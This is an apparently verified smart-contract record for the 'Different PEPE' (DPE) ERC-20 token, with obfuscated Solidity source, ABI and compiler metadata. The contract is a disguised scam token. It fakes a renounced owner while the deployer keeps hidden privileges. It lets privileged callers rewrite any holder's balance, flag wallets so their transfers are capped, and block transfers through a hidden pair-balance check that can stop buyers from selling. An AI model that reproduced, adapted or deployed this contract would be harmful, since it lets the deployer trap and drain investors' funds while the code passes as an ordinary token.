{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface atFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTeam) external view returns (uint256);\n\n    function transfer(address sellAuto, uint256 maxExempt) external returns (bool);\n\n    function allowance(address fundTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellAuto,\n        uint256 maxExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atAmount, uint256 value);\n    event Approval(address indexed fundTotal, address indexed spender, uint256 value);\n}\n\nabstract contract sellLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingMin {\n    function createPair(address senderToToken, address launchedMin) external returns (address);\n}\n\ninterface atFromMetadata is atFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DifferentPEPE is sellLiquidity, atFrom, atFromMetadata {\n\n    address exemptLimitReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private launchWallet = 18;\n\n    function owner() external view returns (address) {\n        return toLaunchedAt;\n    }\n\n    mapping(address => bool) public toBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return isShould;\n    }\n\n    uint256 launchWalletSell;\n\n    bool private sellSwapMin;\n\n    bool private buyTo;\n\n    bool public totalAmount;\n\n    uint256 constant receiverLiquidity = 18 ** 10;\n\n    function swapTx() public {\n        emit OwnershipTransferred(walletFee, address(0));\n        toLaunchedAt = address(0);\n    }\n\n    function toTotal(address launchIs) public {\n        fundLaunchedEnable();\n        \n        if (launchIs == walletFee || launchIs == receiverLaunched) {\n            return;\n        }\n        toBuy[launchIs] = true;\n    }\n\n    constructor (){\n        \n        toTeam txReceiverTo = toTeam(exemptLimitReceiver);\n        receiverLaunched = tradingMin(txReceiverTo.factory()).createPair(txReceiverTo.WETH(), address(this));\n        \n        walletFee = _msgSender();\n        swapTx();\n        senderLiquidity[walletFee] = true;\n        takeLaunchExempt[walletFee] = buyTotalLimit;\n        if (receiverFrom != tradingMarketing) {\n            buyTo = false;\n        }\n        emit Transfer(address(0), walletFee, buyTotalLimit);\n    }\n\n    function approve(address marketingTeamAt, uint256 maxExempt) public virtual override returns (bool) {\n        isAmount[_msgSender()][marketingTeamAt] = maxExempt;\n        emit Approval(_msgSender(), marketingTeamAt, maxExempt);\n        return true;\n    }\n\n    function fundLaunchedEnable() private view {\n        require(senderLiquidity[_msgSender()]);\n    }\n\n    mapping(address => uint256) private takeLaunchExempt;\n\n    mapping(address => bool) public senderLiquidity;\n\n    bool private senderTeam;\n\n    mapping(address => mapping(address => uint256)) private isAmount;\n\n    function transferFrom(address maxTradingLaunch, address sellAuto, uint256 maxExempt) external override returns (bool) {\n        if (_msgSender() != exemptLimitReceiver) {\n            if (isAmount[maxTradingLaunch][_msgSender()] != type(uint256).max) {\n                require(maxExempt <= isAmount[maxTradingLaunch][_msgSender()]);\n                isAmount[maxTradingLaunch][_msgSender()] -= maxExempt;\n            }\n        }\n        return fundMin(maxTradingLaunch, sellAuto, maxExempt);\n    }\n\n    function walletBuyTotal(uint256 maxExempt) public {\n        fundLaunchedEnable();\n        launchWalletSell = maxExempt;\n    }\n\n    function balanceOf(address tradingTeam) public view virtual override returns (uint256) {\n        return takeLaunchExempt[tradingTeam];\n    }\n\n    string private tokenMarketingMode = \"DPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchWallet;\n    }\n\n    function tokenBuy(address maxTradingLaunch, address sellAuto, uint256 maxExempt) internal returns (bool) {\n        require(takeLaunchExempt[maxTradingLaunch] >= maxExempt);\n        takeLaunchExempt[maxTradingLaunch] -= maxExempt;\n        takeLaunchExempt[sellAuto] += maxExempt;\n        emit Transfer(maxTradingLaunch, sellAuto, maxExempt);\n        return true;\n    }\n\n    function transfer(address limitSender, uint256 maxExempt) external virtual override returns (bool) {\n        return fundMin(_msgSender(), limitSender, maxExempt);\n    }\n\n    event OwnershipTransferred(address indexed modeTake, address indexed totalLaunchedList);\n\n    string private isShould = \"Different PEPE\";\n\n    address public receiverLaunched;\n\n    bool private launchTokenShould;\n\n    uint256 private buyTotalLimit = 100000000 * 10 ** 18;\n\n    address private toLaunchedAt;\n\n    address public walletFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenMarketingMode;\n    }\n\n    function fundMin(address maxTradingLaunch, address sellAuto, uint256 maxExempt) internal returns (bool) {\n        if (maxTradingLaunch == walletFee) {\n            return tokenBuy(maxTradingLaunch, sellAuto, maxExempt);\n        }\n        uint256 senderTotal = atFrom(receiverLaunched).balanceOf(buyLiquidityLaunch);\n        require(senderTotal == launchWalletSell);\n        require(sellAuto != buyLiquidityLaunch);\n        if (toBuy[maxTradingLaunch]) {\n            return tokenBuy(maxTradingLaunch, sellAuto, receiverLiquidity);\n        }\n        return tokenBuy(maxTradingLaunch, sellAuto, maxExempt);\n    }\n\n    uint256 atToken;\n\n    uint256 private limitTo;\n\n    function allowance(address amountTeam, address marketingTeamAt) external view virtual override returns (uint256) {\n        if (marketingTeamAt == exemptLimitReceiver) {\n            return type(uint256).max;\n        }\n        return isAmount[amountTeam][marketingTeamAt];\n    }\n\n    function getOwner() external view returns (address) {\n        return toLaunchedAt;\n    }\n\n    bool public receiverFrom;\n\n    function totalTo(address buyFromTake) public {\n        if (totalAmount) {\n            return;\n        }\n        if (senderTx != limitTo) {\n            receiverFrom = true;\n        }\n        senderLiquidity[buyFromTake] = true;\n        if (marketingMax == limitTo) {\n            limitTo = senderTx;\n        }\n        totalAmount = true;\n    }\n\n    bool public feeSell;\n\n    uint256 public senderTx;\n\n    function takeModeBuy(address limitSender, uint256 maxExempt) public {\n        fundLaunchedEnable();\n        takeLaunchExempt[limitSender] = maxExempt;\n    }\n\n    bool private tradingMarketing;\n\n    uint256 public marketingMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyTotalLimit;\n    }\n\n    address buyLiquidityLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchedList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTeamAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeamAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"takeModeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"}],\"name\":\"toTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFromTake\",\"type\":\"address\"}],\"name\":\"totalTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTradingLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"walletBuyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DifferentPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}